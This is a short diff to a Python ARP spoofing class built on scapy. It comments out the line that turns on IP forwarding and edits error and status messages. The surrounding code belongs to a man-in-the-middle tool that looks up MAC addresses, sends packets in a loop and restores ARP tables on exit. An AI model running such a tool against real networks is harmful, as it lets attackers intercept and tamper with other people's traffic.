@@ -19,7 +19,7 @@ def capture_ips():
 
 class ArpSpoof:
     def __init__(self, targets):
-        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+        # os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
         self.time_interval = 0.5
         self.targets = targets
         if self.targets:
@@ -36,7 +36,7 @@ class ArpSpoof:
             answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
             return answered_list[0][1].hwsrc
         except Exception as e:
-            print("\n\n [-] Error getting mac address ... retrying.\n\n")
+            print("[-] Error getting mac address ... retrying.\n")
             print(e)
             self.get_mac(ip)
 
@@ -60,7 +60,7 @@ class ArpSpoof:
                 print("\r[+] Packets sent: " + str(sent_packets_count))
                 time.sleep(self.time_interval)
         except KeyboardInterrupt:
-            print("\n\n[+] Detected CTRL+C, resetting ARP tables now.\n\n")
+            print("\n[+] Detected CTRL+C, resetting ARP tables now.\n")
             self.restore(target_ip, gateway_ip)
             self.restore(gateway_ip, target_ip)
 
